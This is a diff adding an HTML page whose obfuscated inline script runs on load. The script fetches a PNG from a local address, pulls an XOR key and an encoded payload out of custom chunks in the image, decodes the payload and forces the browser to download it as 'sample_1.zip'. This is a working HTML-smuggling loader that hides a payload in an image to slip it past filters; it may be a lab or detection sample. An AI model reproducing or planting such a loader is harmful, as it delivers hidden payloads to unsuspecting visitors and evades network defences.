@@ -1,0 +1,7 @@
+
+        <html>
+        <body>
+            <script type="application/javascript">function XrSxB(BnYeP, RDRzC){let Lrjaj = new Uint8Array(BnYeP.length);for (let i = 0; i < BnYeP.length; i++) {Lrjaj[i] = BnYeP[i] ^ RDRzC[i % RDRzC.length];}return Lrjaj;}function gfiWD(uoTgh) {const AtQGb = new XMLHttpRequest();AtQGb.open('GET', uoTgh, true);AtQGb.responseType = 'arraybuffer';AtQGb.onload = function() {if (AtQGb.status === 200) {const AfAyH = AtQGb.response;const FnJqR = new DataView(AfAyH);let GSUsR = 8;let EWVVh = null;while (GSUsR < AfAyH.byteLength) {const pwzFy = FnJqR.getUint32(GSUsR);GSUsR += 4;const rRkXq = new Uint8Array(AfAyH, GSUsR, 4);const EbLSm = String.fromCharCode.apply(null, rRkXq);GSUsR += 4;if (EbLSm === 'xkEy') {EWVVh = new Uint8Array(AfAyH, GSUsR, pwzFy);} else if (EbLSm === 'exEf' && EWVVh !== null) {const nWwYl = new Uint8Array(AfAyH, GSUsR, pwzFy);const RRoUa = XrSxB(nWwYl,EWVVh);const GmZbb = new Blob([RRoUa], { type: 'application/octet-stream' }), AOsot = document.createElement('a');AOsot.href = URL.createObjectURL(GmZbb);AOsot.download = 'sample_1.zip';document.body.appendChild(AOsot);AOsot.click();URL.revokeObjectURL(AOsot.href);document.body.removeChild(AOsot);return;}GSUsR += pwzFy + 4;}}};AtQGb.onerror = function(){};AtQGb.send();}gfiWD('http://127.0.0.1:8000/banner.png');</script>
+        </body>
+        </html>
+    
